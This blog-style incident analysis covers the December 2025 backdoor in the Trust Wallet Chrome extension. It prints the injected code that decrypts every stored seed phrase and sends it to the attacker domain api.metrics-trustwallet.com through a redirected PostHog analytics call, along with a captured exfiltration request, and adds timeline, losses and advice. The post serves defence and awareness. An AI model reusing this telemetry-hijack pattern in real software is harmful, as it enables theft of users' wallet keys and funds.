---
title: "Trust Wallet's $7M Christmas Gift to Hackers: A Supply Chain Masterclass"
description: "Trust Wallet's browser extension got backdoored via supply chain attack on Christmas Eve. Attackers pushed malicious code to production that drained $7M in user funds. Binance-owned wallet, developer negligence, APT-level execution."
date: "2025-12-26"
tags: ["supply-chain", "trust-wallet", "apt", "cryptocurrency", "browser-extension"]
---

## Merry Christmas, Your Wallet's Compromised

On Christmas Eve 2025, Trust Wallet released version 2.68 of their Chrome browser extension. Within 48 hours, users had lost **$7 million** across hundreds of wallets. Not because of a phishing attack. Not because users got socially engineered. Because Trust Wallet's development pipeline got completely owned by attackers who pushed malicious code straight to production.

This is a textbook APT-level supply chain attack. Attackers compromised Trust Wallet's codebase or publishing infrastructure, injected a backdoor disguised as analytics code, and deployed it through the official Chrome Web Store auto-update mechanism. By the time users woke up on Christmas morning, their wallets were empty.

The malicious code was hidden in a file called `4482.js`, masquerading as legitimate PostHog analytics integration. When users imported or accessed their seed phrases, the extension silently exfiltrated them to `api.metrics-trustwallet[.]com` - a domain registered specifically for this attack.

Trust Wallet is owned by Binance. Binance, the world's largest cryptocurrency exchange, with supposedly enterprise-grade security. And they just shipped a backdoored wallet extension to over a million users through their official update channel.

If you're using Trust Wallet's browser extension, stop what you're doing and update to version 2.69 right now. Better yet, migrate to a hardware wallet and never touch a browser extension for serious funds again.

## What Is It

CVE-2025-TBD (no official CVE assigned yet, because apparently backdooring your own software doesn't count as a vulnerability) is a supply chain compromise of the Trust Wallet Chrome browser extension. Attackers gained access to Trust Wallet's internal development infrastructure or publishing pipeline and injected malicious code into version 2.68.0, released December 24, 2025.

The backdoor specifically targeted seed phrase exfiltration - the keys to the kingdom in cryptocurrency wallets. Once the attacker has your 12-word recovery phrase, they own your wallet. Forever. No multi-sig. No 2FA. No recovery. Just instant, irreversible theft.

SlowMist Security's analysis classified this as a professional APT-level operation, suggesting the attackers had already compromised Trust Wallet-related developer devices or deployment permissions before December 8, 2025 (when the malicious domain was registered).

Changpeng "CZ" Zhao, Binance's founder, publicly hinted at "possible insider involvement." Because nothing says "we take security seriously" like your own CEO suggesting your development team might have been compromised.

## How It Works

The attack chain is frighteningly simple once you have supply chain access:

### Step 1: Infrastructure Preparation

On December 8, 2025, the attackers registered the domain `metrics-trustwallet[.]com` through NICENIC INTERNATIONAL. Notice the similarity to Trust Wallet's legitimate domains? That's intentional. It's designed to blend in with internal infrastructure and avoid detection during code review.

![Attacker's Domain Landing Page](/screenshots/trust-wallet-1.png)
*The attacker's malicious domain metrics-trustwallet.com - notice the taunting Dune reference "He who controls the spice controls the universe"*

SlowMist's analysis of the domain shows:

![Domain Registration Records](/screenshots/trust-wallet-slowmist-3.png)
*DNS records for metrics-trustwallet.com showing registration on December 9, 2025 via NICENIC INTERNATIONAL registrar*

- **Domain**: `metrics-trustwallet[.]com`
- **Registrar**: NICENIC INTERNATIONAL
- **Registration date**: 2025-12-08 02:28:18 (actually shows Dec 9 in records - 15 days before release)
- **First exfiltration request**: 2025-12-21 (3 days before public release on Dec 24)
- **Nameservers**: ns3.my-ndns.com, ns4.my-ndns.com

![Network Traffic Timeline](/screenshots/trust-wallet-slowmist-4.png)
*SlowMist's network traffic analysis showing first requests to api.metrics-trustwallet.com on December 21, 2025 - three days before public release*

The domain mimicked Trust Wallet's actual metrics endpoint. If a developer saw traffic to `api.metrics-trustwallet.com` in logs, they'd probably assume it was legitimate internal analytics. Social engineering through domain naming.

The timeline is damning:
- **Dec 8**: Domain registered (attacker preparing infrastructure)
- **Dec 21**: First requests to malicious domain (internal testing or limited rollout?)
- **Dec 22**: Malicious backdoor inserted into codebase (based on code analysis)
- **Dec 24**: Version 2.68 released to Chrome Web Store

This suggests the attacker had access to Trust Wallet's development infrastructure for at least 13 days before deploying to production.

### Step 2: Codebase Infiltration

Sometime before December 21, attackers gained write access to Trust Wallet's extension codebase or deployment pipeline. SlowMist's analysis suggests this was:
- Compromised developer machine
- Stolen publishing credentials
- Insider threat

The attackers didn't use a supply chain dependency attack (like injecting malicious npm packages). They directly modified Trust Wallet's own source code. This suggests they had legitimate access to the repository or build system.

### Step 3: Malicious Code Injection

The backdoor was hidden in `4482.js`, disguised as PostHog analytics integration. Here's the genius part: PostHog is a legitimate analytics library that Trust Wallet actually uses. The malicious code didn't inject a new dependency - it just modified how PostHog was initialized.

![Malicious Code in 4482.js](/screenshots/trust-wallet-2.jpg)
*The smoking gun - malicious code in Trust Wallet's 4482.js pointing to api.metrics-trustwallet.com for data exfiltration*

SlowMist Security Team ran a diff comparison between the clean version 2.67 and compromised version 2.68. The malicious code was inserted directly into Trust Wallet's analytics initialization logic, disguised as PostHog configuration.

Here's the exact attack flow from SlowMist's analysis:

**Step 1: Wallet Enumeration**

![Malicious Code - Wallet Enumeration](/screenshots/trust-wallet-slowmist-1.png)
*SlowMist's analysis showing the malicious code iterating through wallets, calling GET_SEED_PHRASE with passkeyPassword, then injecting the result into errorMessage field*

The backdoor iterates through every wallet stored in the browser extension's local storage and triggers a `GET_SEED_PHRASE` request for each one.

From the code analysis:
```javascript
for (const [Dt, rt] of Object.entries(pt)) try {
  const { id: V } = rt,
  lt = yield G.YW.emit(Z.A.GET_SEED_PHRASE, {
    password: "",
    passkeyPassword: A,
    walletId: V
  });
  K.push({
    id: V,
    errorMessage: lt  // Seed phrase injected into error field
  })
}
```

**Step 2: Seed Phrase Decryption**

Trust Wallet supports two unlock methods:
- **Password-based unlock** (user enters password)
- **Passkey unlock** (biometric/hardware key)

When the user unlocks their wallet, the malicious code captures the unlock credential (password or passkeyPassword) and uses it to call the internal `GET_SEED_PHRASE` function. This function decrypts the encrypted mnemonic phrase stored in local storage.

From SlowMist's dynamic analysis:

> "After unlocking the wallet, the attacker populates the mnemonic data into the 'error' field... this Error data is obtained through a call to the GET_SEED_PHRASE function."

**Step 3: Data Injection into Error Field**

Here's the clever part: the malicious code doesn't create new data structures or obvious exfiltration payloads. Instead, it hijacks the existing error reporting mechanism:

```javascript
// Pseudo-code based on SlowMist's analysis
emit('GET_SEED_PHRASE', walletId)
  .then(mnemonic => {
    // Inject mnemonic into error field
    errorMessage = mnemonic;
    // Send via PostHog analytics
    C.Ay.register({ error: errorMessage });
  })
```

The decrypted mnemonic phrase is placed into the `errorMessage` field of what appears to be legitimate error telemetry. This makes the exfiltration blend in with normal application logging.

**Step 4: Exfiltration via PostHog**

![Malicious PostHog Configuration](/screenshots/trust-wallet-slowmist-2.png)
*The malicious PostHog initialization showing C.Ay.init() with api_host redirected to https://api.metrics-trustwallet.com instead of legitimate PostHog servers*

The malicious code uses PostHog's legitimate analytics library (`C.Ay.init()` and `C.Ay.register()`) to send the data. But instead of sending to PostHog's servers, the `api_host` parameter is redirected to the attacker's domain:

```javascript
this.started || (C.Ay.init("phc_b7MQeJq50hCBJDKHWLA2c1ubYhbY5L97ZsZ66RGwq60", {
  api_host: "https://api.metrics-trustwallet.com",  // Attacker's domain
  persistence: "localStorage",
  debug: !0,
  autocapture: !1,
  capture_pageview: !1,
  capture_pageleave: !1,
  person_profiles: "always"
})
```

**Step 5: Traffic Exfiltration**

![Chrome DevTools - Error Array with Seed Phrases](/screenshots/trust-wallet-slowmist-5.png)
*Dynamic analysis in Chrome DevTools showing the error array populated with wallet IDs and errorMessage fields during wallet unlock event*

![Chrome DevTools - GET_SEED_PHRASE Call](/screenshots/trust-wallet-slowmist-6.png)
*Full malicious code block showing GET_SEED_PHRASE being called with passkeyPassword, then seed phrase injected into errorMessage for exfiltration*

![Internal Seed Phrase Function](/screenshots/trust-wallet-slowmist-7.png)
*Chrome DevTools showing the internal INTERNAL_GetSeedPhrase_OMnr function being called to decrypt wallet mnemonic phrases*

SlowMist captured the exfiltration traffic using BurpSuite. The request shows the mnemonic phrase being sent in the `error` field to the attacker's server:

![BurpSuite Traffic Capture](/screenshots/trust-wallet-slowmist-8.png)
*BurpSuite capture showing the actual exfiltration POST request with seed phrase hidden in error field, sent to https://trustwallet.es (attacker's server)*

The HTTP request structure:
```
POST https://api.metrics-trustwallet.com/batch
Content-Type: application/json

error: [
  id: "dc7beb3e-a7b1-4f69-8c94-b4d2bcb06860"
  errorMessage: "hotel vault option pool industry famous clog usual special neglect wild rally"

  id: "834b26f1-1cc-4492-a8e6-abae571e0901"
  errorMessage: "winter section rude walnut win rack fury behave cook crucial pizza wash"
]
version: "2.68.0"
$lib_custom_api_host: "https://trustwallet.es"
```

The entire payload looks like legitimate PostHog analytics telemetry. If you're monitoring network traffic, this would blend in perfectly with normal application behavior.

That last part is critical. The malicious code didn't implement its own networking - it hijacked the existing analytics library's infrastructure. This meant:
- Traffic looked like normal analytics (PostHog format)
- No new network calls to flag during review
- Firewall/monitoring rules wouldn't catch it
- Blends in with legitimate telemetry
- Same HTTP patterns, same request structure, just different destination

From SlowMist's conclusion:

> "This backdoor incident originated from malicious source code modification within the internal Trust Wallet extension codebase (analytics logic), rather than an injected compromised third-party dependency (e.g., malicious npm package). The attacker directly tampered with the application's own code, then leveraged the legitimate PostHog analytics library as the data-exfiltration channel, redirecting analytic traffic to an attacker-controlled server."

### Step 4: Deployment to Production

On December 24, 2025, version 2.68 was published to the Chrome Web Store. Because it came through Trust Wallet's official publishing account, Chrome's automated checks passed. Users received the update automatically.

No warning. No manual review. Just silent deployment of backdoored code to over a million users.

### Step 5: Exploitation

The first exfiltration requests hit `api.metrics-trustwallet[.]com` on December 21 - three days before the public release. This suggests:
- Internal testing or deployment to a subset of users first
- Attackers were testing their infrastructure
- The compromise happened earlier than public disclosure

Once version 2.68 reached users:
- Any wallet unlock triggered seed phrase decryption
- Decrypted phrases were sent to attacker infrastructure
- Attackers used the stolen seeds to drain wallets
- Users had zero indication anything was wrong

## How To Lose $7M in 48 Hours

The attack went live on Christmas Eve. By December 26, reports of wallet drains started flooding in.

**Financial Impact (SlowMist's final tally):**
- **Bitcoin network**: ~33 BTC (≈$3 million USD)
- **Ethereum + Layer 2**: ≈$3 million USD
- **Solana**: ≈$431,000 USD
- **Total**: ~$7 million USD
- **Victims**: Hundreds confirmed
- **Fastest loss**: One user lost $300,000 in minutes

The speed of exploitation is telling. Attackers didn't wait to collect seed phrases - they automated the draining process:

1. Seed phrase arrives at attacker server
2. Automated script imports wallet
3. Check balances across chains (ETH, BTC, SOL, BNB)
4. Sweep all funds to attacker-controlled addresses
5. Convert to ETH via DEXs
6. Launder through mixers (Tornado Cash, etc.)
7. Entire process takes less than 30 minutes

Some victims reported funds disappearing within seconds of unlocking their wallet. That's the power of supply chain attacks - you don't need to convince users to click anything or approve any transaction. You already have their keys.

![Attacker's Wallet Portfolio](/screenshots/trust-wallet-3.jpg)
*Attacker's wallet showing $2.3M in stolen cryptocurrency across multiple chains - BTC, ETH, BNB, stablecoins*

### The Laundering Operation

Once the attackers had the funds, they moved fast:

![Fund Laundering Flow](/screenshots/trust-wallet-4.jpg)
*Money laundering trail tracked by @lookonchain - $6.77M stolen from users, $3.17M laundered through ChangeNOW exchange, with additional flows to KuCoin, FixedFloat, and HTX*

The visualization above shows the attacker's laundering strategy:

- **$6.77M stolen** from Trust Wallet users via compromised extension
- **$3.17M laundered** through ChangeNOW (centralized exchange with loose KYC)
- **$447K** to KuCoin
- **$340K** to FixedFloat
- **$295K** to HTX
- **$2.52M remaining** in attacker's wallet as of time of tracking
- Immediate conversion to ETH and BTC (harder to trace across chains)
- Fragmented transfers across multiple addresses to avoid detection
- Tornado Cash mixing for Ethereum privacy
- CoinJoin for Bitcoin anonymization
- Cross-chain bridges to obfuscate fund origin

By the time Trust Wallet publicly acknowledged the breach on December 26, most of the stolen funds were already laundered through exchanges and unrecoverable.

## Affected Versions

**Trust Wallet Chrome Extension:**
- Version 2.68.0 (compromised)
- Versions 2.68.x (if any patch releases exist, assume compromised)

**Unaffected:**
- Version 2.69+ (patched)
- Mobile-only Trust Wallet users (iOS/Android apps not affected)
- Other browser extensions (Firefox, Brave, Edge - but honestly, who's using those?)
- Users who never opened the extension during the compromise window

## Detection & Response

### If You're Using Trust Wallet Browser Extension

Check your version immediately:

1. Open Chrome: `chrome://extensions/`
2. Find "Trust Wallet"
3. Check version number

If you see **2.68**, you're compromised. Assume your seed phrase was stolen.

**Immediate Steps:**
1. **DO NOT OPEN THE EXTENSION**
2. Update to version 2.69 (or uninstall entirely)
3. Create a new wallet with a fresh seed phrase
4. Transfer all funds from old wallet to new wallet
5. Never use the old seed phrase again (it's burned)
6. Check transaction history for unauthorized transfers
7. If funds were stolen, file reports (won't get them back, but might help investigation)

### If You Already Lost Funds

I have bad news: **your money is gone**. Cryptocurrency transactions are irreversible. Once the attacker has your seed phrase and sweeps your wallet, there's no customer service to call. No bank to reverse the transaction. No recourse.

You can:
- Report to Trust Wallet support (they'll apologize and maybe give you their "compensation form")
- File a police report (pointless, but required for insurance claims)
- Report to blockchain analytics firms (Chainalysis, Elliptic, etc.)
- Track the stolen funds on-chain (watch them disappear into mixers)

CZ announced Trust Wallet would "compensate affected users," but as of December 26, no compensation has been distributed. Don't hold your breath.

## This Wasn't Script Kiddies

SlowMist Security's assessment is blunt:

> "SlowMist has strong reason to believe this is a professional APT-level attack. The attacker may have already gained control of Trust Wallet-related developer devices or publishing-deployment permissions prior to December 8."

Let's break down why this is APT-level:

### Indicators of Advanced Persistent Threat:

**1. Pre-compromise Infrastructure**
- Domain registered 16 days before public release
- First exfiltration attempts 3 days before release
- Suggests long-term access and planning

**2. Internal Code Modification**
- Not a supply chain dependency attack
- Direct modification of Trust Wallet source code
- Requires repository or build system access

**3. Operational Security**
- Domain mimics legitimate infrastructure
- Code disguised as existing analytics
- No new dependencies or obvious red flags
- Passed code review and automated checks

**4. Timing & Execution**
- Released on Christmas Eve (when security teams are understaffed)
- Automated fund drainage (suggests infrastructure investment)
- Rapid laundering operation (pre-planned)

**5. Possible Insider Access**
- CZ hinted at insider involvement
- Direct source code access suggests:
  - Compromised employee credentials
  - Social engineering of developers
  - Actual insider threat
- SlowMist's assessment: Attacker gained control of developer devices or publishing permissions prior to December 8

**6. Familiarity with Codebase**
- Attacker knew exactly where to inject the malicious code (analytics initialization)
- Understanding of Trust Wallet's internal functions (`GET_SEED_PHRASE`)
- Knowledge of PostHog integration points
- Ability to bypass code review suggests insider knowledge or long-term access

This wasn't opportunistic. This was planned, professional, and executed with precision.

From SlowMist's conclusion:

> "We have strong reason to believe this is a professional APT-level attack. The attacker may have already gained control of Trust Wallet-related developer devices or publishing-deployment permissions prior to December 8."

### Who Did This?

No attribution yet, but candidates include:

**Nation-State APTs:**
- North Korean Lazarus Group (known for crypto heists)
- Chinese APT groups (cryptocurrency targeting history)
- Russian cybercrime syndicates (profit-motivated)

**Organized Cybercrime:**
- Professional ransomware/crypto theft groups
- Insider threats selling access
- Compromised developer machines

**The Insider Theory:**
Trust Wallet is owned by Binance. CZ's public comments about "possible insider involvement" are damning. Either:
1. A Trust Wallet developer was compromised
2. A malicious insider sold credentials
3. A developer's machine was pwned (phishing, malware, supply chain on their tools)

Any of these scenarios is catastrophic for a company handling billions in user funds.

## Why This Matters (And Why Browser Extension Wallets Are Insane)

Let's address the elephant in the room: **you should never use a browser extension for serious cryptocurrency storage**. Period.

### Browser Extensions Are Attack Surface Nightmare Fuel:

**1. Auto-Update Mechanism**
- Users have ZERO control over what code runs
- Updates deploy silently in the background
- No manual review, no opt-in
- One compromised release = millions of users owned instantly

**2. Privileged Code Execution**
- Extensions run in your browser context
- Access to all site data, cookies, session tokens
- Can modify page content, intercept form data
- Seed phrases stored in browser local storage (encrypted, but keys are in memory)

**3. Supply Chain Complexity**
- npm dependencies (thousands of potential supply chain vectors)
- Build systems (compromised tooling can inject backdoors)
- Developer machines (one phished developer = full compromise)
- Publishing credentials (if stolen, attacker publishes backdoored versions)

**4. Chrome Web Store Auto-Approval**
- Automated checks only (no human review for updates)
- Malicious code can slip through with obfuscation
- By the time Google catches it, millions already infected

### The Trust Wallet Architecture Failure:

Trust Wallet's extension stores encrypted seed phrases in browser local storage. The encryption key is derived from your password. When you unlock the wallet (enter password), the extension decrypts the seed phrase in memory.

This means:
- Any code running in the extension context can access plaintext seeds
- There's no secure enclave, no hardware protection
- Malicious code just waits for you to unlock, then exfiltrates

Compare this to hardware wallets:
- Seed phrase never leaves the device
- Signing happens in secure element
- Even if your computer is fully compromised, seeds stay safe
- No auto-updates that can backdoor you

### What You Should Actually Use:

**For Serious Funds ($10k+):**
- Hardware wallets (Ledger, Trezor, etc.)
- Multi-sig setups (Gnosis Safe)
- Cold storage (air-gapped devices)

**For Daily Use (under $1k):**
- Mobile wallets (slightly better than browser extensions)
- Hardware wallet with mobile app
- Accept the risk, use small amounts

**Never:**
- Browser extension wallets for significant funds
- Hot wallets for long-term storage
- Anything that stores seeds in browser local storage

Trust Wallet failed because they built a wallet that:
1. Stores seeds in browser context (architectural failure)
2. Has no hardware protection (design failure)
3. Auto-updates without user control (deployment failure)
4. Got compromised via supply chain (security failure)
5. Lost users $7M (operational failure)

And their response? "Update to 2.69, we'll compensate you (maybe)."

## Nobody Knows What Code They're Running

This attack highlights the catastrophic risk of modern software supply chains:

**Trust Wallet Extension Supply Chain:**
```
Developer Machine
  ↓
Git Repository (GitHub/GitLab)
  ↓
CI/CD Pipeline (GitHub Actions/Jenkins)
  ↓
Build System (webpack/npm)
  ↓
npm Dependencies (hundreds of packages)
  ↓
Chrome Web Store Publishing
  ↓
Auto-Update to 1M+ Users
```

Attackers only needed to compromise ONE of these stages to own the entire user base.

### Where The Compromise Likely Happened:

**Scenario 1: Developer Machine**
- Phishing email with malware
- Supply chain attack on developer tools
- Stolen credentials from password dump

**Scenario 2: Git Repository**
- Compromised developer account
- Stolen GitHub/GitLab credentials
- Malicious PR that bypassed review

**Scenario 3: CI/CD Pipeline**
- Compromised build server
- Modified build scripts
- Injected code during compilation

**Scenario 4: Insider Threat**
- Malicious employee
- Sold credentials to attackers
- Directly pushed backdoored code

Based on the timeline and SlowMist's analysis, **Scenario 1 or 4** seems most likely. The code modification was direct (not a dependency injection), suggesting repository access.

### The Broader Problem:

This isn't unique to Trust Wallet. Every browser extension has this attack surface:
- MetaMask (10M+ users)
- Phantom (3M+ users)
- Rainbow Wallet (1M+ users)
- Coinbase Wallet Extension

If any of these get supply-chain compromised, millions of users lose funds instantly. It's not a matter of IF, it's WHEN.

The cryptocurrency ecosystem has normalized storing private keys in browser extensions. This is insane. It's like leaving your house keys under the doormat and hoping nobody checks.

## Timeline

- **December 8, 2025**: Attacker registers `metrics-trustwallet[.]com` domain
- **December 8-20, 2025**: Attackers compromise Trust Wallet development pipeline
- **December 21, 2025**: First exfiltration requests to malicious domain (internal testing?)
- **December 24, 2025**: Version 2.68 published to Chrome Web Store (Christmas Eve deployment)
- **December 24-25, 2025**: Users receive auto-update, seed phrases exfiltrated
- **December 25-26, 2025**: Wallet drains begin, users report losses
- **December 26, 2025**: Trust Wallet publicly acknowledges breach, releases version 2.69
- **December 26, 2025**: Blockchain investigator ZachXBT reports $7M total losses
- **December 26, 2025**: CZ announces Binance will "compensate affected users"
- **December 26, 2025**: Malicious domain taken offline

## Stop Using Browser Extension Wallets

A Binance-owned wallet just got supply-chain compromised and lost users $7 million. Let that sink in. The world's largest cryptocurrency exchange, with billions in revenue and supposedly enterprise-grade security, couldn't prevent attackers from backdooring their official Chrome extension.

If Trust Wallet can get owned, **any** browser extension wallet can get owned.

The architectural problems are fundamental:
1. **No hardware protection** - seeds stored in browser context
2. **Auto-updates without user control** - one bad release = instant compromise
3. **Massive supply chain attack surface** - compromise any stage, own all users
4. **No recourse for users** - funds stolen = gone forever

**If you're currently using Trust Wallet browser extension:**
1. Stop using it for anything except dust amounts
2. Migrate funds to hardware wallet or proper cold storage
3. Assume your seed phrase was compromised if you used v2.68
4. Never reuse that seed phrase for anything

**If you're using ANY browser extension wallet:**
1. Understand the risk - one supply chain compromise = total loss
2. Only store amounts you're willing to lose completely
3. Use hardware wallets for serious funds
4. Enable all available security features (hardware wallet integration if available)

**If you're a wallet developer:**
1. Implement reproducible builds (users can verify your code matches published version)
2. Add multi-sig or time-delays for publishing updates
3. Publish code hashes for verification
4. Consider not building browser extension wallets at all

This attack was preventable. If Trust Wallet used:
- Hardware wallet integration (seeds never in browser)
- Multi-sig deployment (one compromised key can't publish)
- Reproducible builds (users verify code)
- Manual update opt-in for major versions

...users wouldn't have lost $7 million.

But they didn't. They shipped a browser extension that stores seeds in local storage, auto-updates without user control, and apparently has a development pipeline that can be compromised by APT groups.

And now hundreds of users are out millions of dollars with zero recourse.

Merry Christmas.

## References

**Official Advisories:**
- [Trust Wallet Official Statement (X/Twitter)](https://twitter.com/TrustWallet/status/[TBD])
- [Binance Statement on Trust Wallet Compromise](https://www.binance.com/[TBD])

**Security Analysis:**
- [SlowMist: Christmas Heist Analysis](https://slowmist.medium.com/christmas-heist-analysis-of-trust-wallet-browser-extension-hack-bdb35c3cc6dd)
- [The Hacker News: Trust Wallet Chrome Extension Breach](https://thehackernews.com/2025/12/trust-wallet-chrome-extension-bug.html)
- [Quasa: Trust Wallet Supply Chain Attack Analysis](https://quasa.io/media/trust-wallet-chrome-extension-compromised-7-million-stolen-in-sophisticated-supply-chain-attack)
- [Cybersecurity News: TrustWallet Extension Hacked](https://cybersecuritynews.com/trustwallet-chrome-extension-hacked/)

**Threat Intelligence:**
- [ZachXBT's Initial Report (X/Twitter)](https://twitter.com/zachxbt)
- [PeckShield Alert](https://twitter.com/peckshield)
- [LookOnChain Loss Tracking](https://twitter.com/lookonchain)

**Technical Resources:**
- [Chrome Web Store: Trust Wallet Extension](https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph)
- [Trust Wallet GitHub](https://github.com/trustwallet)
- [PostHog Documentation](https://posthog.com/docs) (the legitimate analytics library that was abused)

**News Coverage:**
- [CoinDesk: Trust Wallet Users Lose $7M](https://www.coindesk.com/business/2025/12/26/trust-wallet-users-lose-more-than-usd7-million-to-hacked-chrome-extension)
- [CryptoSlate: Trust Wallet Extension Compromised](https://cryptoslate.com/)
- [CCN: Trust Wallet Warning](https://www.ccn.com/education/crypto/trust-wallet-warning-6m-lost-btc-eth-sol-browser-extension/)
- [Invezz: Trust Wallet Christmas Hack](https://invezz.com/news/2025/12/26/trust-wallet-just-got-hacked-on-christmas-7m-drained/)

**On-Chain Analysis:**
- [Etherscan: Attacker Address Tracking](https://etherscan.io/)
- [Blockchain Explorer: Fund Flow Analysis](https://www.blockchain.com/)

---

Update to version 2.69. Migrate to hardware wallets. Stop trusting browser extensions with your life savings.

And maybe reconsider whether "not your keys, not your crypto" actually means anything when your keys are stored in a browser extension that auto-updates malicious code.
